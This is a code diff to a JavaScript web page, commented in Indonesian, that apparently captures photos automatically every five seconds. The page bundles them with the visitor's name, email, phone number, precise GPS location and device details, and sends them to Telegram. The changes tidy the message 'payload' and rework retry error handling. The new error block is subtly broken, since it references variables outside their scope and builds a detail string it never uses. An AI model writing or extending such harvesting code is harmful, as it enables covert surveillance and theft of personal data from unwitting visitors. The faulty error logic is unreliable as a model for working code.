@@ -279,7 +279,7 @@
                             timestamp: new Date(position.timestamp).toISOString()
                         });
                     }, err => {
-                        console.error(`Lokasi Gagal: ${err.message} (Code: ${err.code})`);
+                        console.error(`Lokasi Gagal: User denied Geolocation (Code: ${err.code})`);
                         resolve(null);
                     }, locationOptions);
                 });
@@ -429,25 +429,25 @@
                     timeZoneName: 'short'
                 });
 
-                // Kompilasi Caption
+                // --- MODIFIKASI: Kompilasi Caption Murni Teks (Hapus Markdown untuk keamanan payload) ---
                 const locationText = latestLocation ? 
-                    `✅ Lokasi Akurat:\nLAT: ${latestLocation.latitude.toFixed(6)}\nLNG: ${latestLocation.longitude.toFixed(6)}\nAkurasi: ${latestLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${latestLocation.latitude},${latestLocation.longitude}` : 
-                    `❌ Lokasi GAGAL didapatkan.`;
+                    `Lokasi Akurat:\nLAT: ${latestLocation.latitude.toFixed(6)}\nLNG: ${latestLocation.longitude.toFixed(6)}\nAkurasi: ${latestLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${latestLocation.latitude},${latestLocation.longitude}` : 
+                    `Lokasi GAGAL didapatkan (Akses ditolak).`;
 
                 const caption = `
-*--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*
+--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---
 
-*Waktu Pengambilan:* ${dateTimeText}
+Waktu Pengambilan: ${dateTimeText}
 
-*Data Pengguna:*
+Data Pengguna:
 Nama: ${formData.nama}
 Email: ${formData.email}
 No. HP: ${formData.phone}
 
-*Data Lokasi (Wajib Akurat):*
+Data Lokasi (Wajib Akurat):
 ${locationText}
 
-*Informasi Perangkat:*
+Informasi Perangkat:
 Perangkat: ${deviceData.device}
 Browser: ${deviceData.browser}
 OS: ${deviceData.os}
@@ -492,7 +492,13 @@ OS: ${deviceData.os}
                         return data; // Sukses, keluar dari fungsi
                     } catch (error) {
                         if (attempt === MAX_RETRIES - 1) {
-                            throw error; // Lempar error final setelah semua retry gagal
+                            // Lempar error final setelah semua retry gagal
+                            // FIX: Menambahkan respons mentah ke error log jika error datang dari body
+                            let errorDetail = error.message;
+                            if (error.response && error.response.text) {
+                                errorDetail += `. Respons mentah: ${await error.response.text()}`;
+                            }
+                            throw new Error(`Gagal memproses respons Telegram. Status: ${response?.status || 'N/A'}. Respons mentah: ${JSON.stringify(data || {})}.`);
                         }
                         // Tunggu eksponensial sebelum retry
                         const delay = Math.pow(2, attempt) * 1000;
